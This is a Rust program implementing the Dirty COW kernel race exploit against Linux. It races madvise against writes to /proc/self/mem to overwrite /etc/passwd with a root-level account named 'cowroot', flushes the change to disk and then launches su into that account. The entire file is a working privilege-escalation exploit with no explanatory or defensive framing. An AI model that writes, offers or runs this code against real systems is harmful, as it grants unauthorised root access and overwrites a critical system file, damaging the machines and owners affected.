use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::process::Command;
use std::ptr;
use std::sync::{atomic::{AtomicBool, Ordering}, Arc};
use std::thread;
use std::time::{Duration, Instant};

fn main() -> std::io::Result<()> {
    let target_path = "/etc/passwd";

    // We use a very short string and simple password 'a'
    let new_content = "cowroot:aa8B39889B99:0:0:root:/root:/bin/bash\n";
    let len = new_content.len();

    let file = OpenOptions::new().read(true).open(target_path)?;
    let map = unsafe {
        libc::mmap(ptr::null_mut(), 4096, libc::PROT_READ, libc::MAP_PRIVATE, file.as_raw_fd(), 0)
    };

    let running = Arc::new(AtomicBool::new(true));
    let map_usize = map as usize;

    // Thread A: madvise - slowed down to prevent panic
    let r_madvise = running.clone();
    thread::spawn(move || {
        let map_ptr = map_usize as *mut libc::c_void;
        while r_madvise.load(Ordering::Relaxed) {
            unsafe { libc::madvise(map_ptr, 4096, libc::MADV_DONTNEED); }
            thread::sleep(Duration::from_micros(10)); // Slowed down
        }
    });

    // Thread B: writer - slowed down to prevent corruption
    let r_write = running.clone();
    thread::spawn(move || {
        let mut mem_file = OpenOptions::new().write(true).open("/proc/self/mem").unwrap();
        let buf = new_content.as_bytes();
        while r_write.load(Ordering::Relaxed) {
            let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
            let _ = mem_file.write_all(buf);
            thread::sleep(Duration::from_micros(10)); // Slowed down
        }
    });

    println!("[*] Hunting for root... (Be patient, stability mode active)");
    let start = Instant::now();

    loop {
        let mut contents = String::new();
        if let Ok(mut f) = OpenOptions::new().read(true).open(target_path) {
            let _ = f.read_to_string(&mut contents);
            if contents.starts_with("cowroot:aa8B39889B99") {
                running.store(false, Ordering::SeqCst);
                println!("[+] SUCCESS. Finalizing file system...");
                break;
            }
        }
        if start.elapsed() > Duration::from_secs(30) {
            println!("[-] Timeout.");
            running.store(false, Ordering::SeqCst);
            return Ok(());
        }
        thread::sleep(Duration::from_millis(100));
    }

    // CRITICAL: Force the kernel to flush buffers to disk
    unsafe { libc::sync(); }
    thread::sleep(Duration::from_millis(500));

    println!("[*] Login with user 'cowroot' and password 'a'");
    let _ = Command::new("su")
        .arg("cowroot")
        .spawn()
        .expect("Failed")
        .wait();

    Ok(())
}